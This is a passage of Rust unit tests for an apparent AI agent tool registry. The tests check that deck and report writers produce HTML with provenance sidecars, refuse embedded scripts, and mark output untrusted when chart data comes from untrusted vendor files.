        let (r, stamps) = run_tool(&mut f, "write_deck", deck_args(None));
        assert!(!r.is_error && r.content.starts_with("created missions/m1/artifacts/roadmap.html (") && stamps.len() == 2, "{}", r.content);
        let html = fs::read_to_string(f.root.join("local/missions/m1/artifacts/roadmap.html")).unwrap();
        assert!(html.contains("with write_deck at 2026-10-25T12:00:00.000Z; trust L3") && html.contains("data-deck") && html.contains("<figure class=\"chart\">") && delphi_docs::htmllint::lint(&html).is_empty());
        let side = fs::read_to_string(f.root.join("local/missions/m1/artifacts/roadmap.html.provenance.md")).unwrap();
        assert!(side.contains("produced_by: write_deck") && side.contains("- contents: 3 slides") && !side.contains("free-form script"), "{}", side);
        let (r, _) = run_tool(&mut f, "write_report", report_args(None));
        assert!(!r.is_error, "{}", r.content);
        let mut ctx = ToolCtx { guard: &f.guard, span: &mut f.span, index: &mut f.index, rules: &f.rules, probe: &AssumeClean, role: "architect", mission_id: "m1", now_rfc3339: "t", stamps: vec![] };
        let back = Registry::builtin().run(&mut ctx, "read_doc", &json!({"path": "missions/m1/artifacts/q3.html"}));
        assert!(back.content.contains("# Q3") && back.content.contains("Latency"), "{}", back.content);
    }

    #[test]
    fn decks_and_reports_are_as_green_as_any_mission_artifact_and_never_take_a_script() {
        let reg = Registry::builtin();
        for (tool, args) in [("write_deck", deck_args(None)), ("write_report", report_args(None))] {
            let c = reg.classify(tool, &args).unwrap();
            assert_eq!((c.tier, c.kind), (ToolTier::Green, ActionKind::MissionArtifact), "{}", tool);
            let mut wt = args.clone();
            wt["path"] = json!("@worktree/docs/out.html");
            assert_eq!(reg.classify(tool, &wt).unwrap().kind, ActionKind::WorktreeEdit);
            let mut scripted = args.clone();
            scripted["script"] = json!("document.title = 'x';");
            let e = reg.classify(tool, &scripted).unwrap_err();
            assert!(e.0.contains("takes no `script`"), "{}", e);
            let mut f = fx(&["missions/**"]);
            let (r, stamps) = run_tool(&mut f, tool, scripted);
            assert!(r.is_error && stamps.is_empty() && !f.root.join("local/missions/m1/artifacts").exists(), "{}", r.content);
        }
        // a bad chart inside a slide is refused with the chart's reason before anyone is asked
        let mut bad = deck_args(None);
        bad["slides"][1]["chart"]["type"] = json!("pie");
        assert!(reg.classify("write_deck", &bad).unwrap_err().0.contains("chart block"));
        // a page may hold a chart too
        let page = json!({"path": "p", "title": "P", "blocks": [{"type": "grid", "columns": 2, "blocks": [{"type": "chart", "chart": chart_block(None)}, {"type": "markdown", "text": "x"}]}]});
        assert_eq!(reg.classify("write_html", &page).unwrap().kind, ActionKind::MissionArtifact);
    }

    #[test]
    fn charts_in_a_deck_that_read_a_file_carry_its_trust_and_taint_the_span() {
        let mut f = fx(&["missions/**"]);
        fs::write(f.root.join("proj/src/latency.csv"), "release,p50,p95\n0.2.1,120,340\n0.2.2,118,310\n0.2.3,104,255\n").unwrap();
        fs::write(f.root.join("proj/vendor/lib/latency.csv"), "release,p50,p95\n0.2.1,1,2\n0.2.2,3,4\n").unwrap();
        // classification does not open files, and a missing one is refused by the precheck, before anything is written
        assert!(Registry::builtin().classify("write_deck", &deck_args(Some("@project/app/src/latency.csv"))).is_ok());
        let (r, stamps) = run_tool(&mut f, "write_deck", deck_args(Some("@project/app/src/missing.csv")));
        assert!(r.is_error && r.content.contains("not found") && stamps.is_empty());
        let (r, _) = run_tool(&mut f, "write_deck", deck_args(Some("@project/app/src/latency.csv")));
        assert!(!r.is_error, "{}", r.content);
        let html = fs::read_to_string(f.root.join("local/missions/m1/artifacts/roadmap.html")).unwrap();
        assert!(html.contains("Source: data: @project/app/src/latency.csv (trust L4 internal_empirical)"), "{}", html.len());
        let side = fs::read_to_string(f.root.join("local/missions/m1/artifacts/roadmap.html.provenance.md")).unwrap();
        assert!(side.contains("@project/app/src/latency.csv (") && side.contains("blake3"), "{}", side);
        // untrusted data makes the whole report untrusted, and it says so
        let (r, stamps) = run_tool(&mut f, "write_report", report_args(Some("@project/app/vendor/lib/latency.csv")));
        assert!(!r.is_error && r.content.contains("tier L0") && stamps.iter().all(|s| s.tier == Tier::L0), "{}", r.content);
        let html = fs::read_to_string(f.root.join("local/missions/m1/artifacts/q3.html")).unwrap();
        assert!(html.contains("trust L0 external_untrusted") && html.contains("Source: data: @project/app/vendor/lib/latency.csv (trust L0"), "the document and the chart both say so");
    }
}
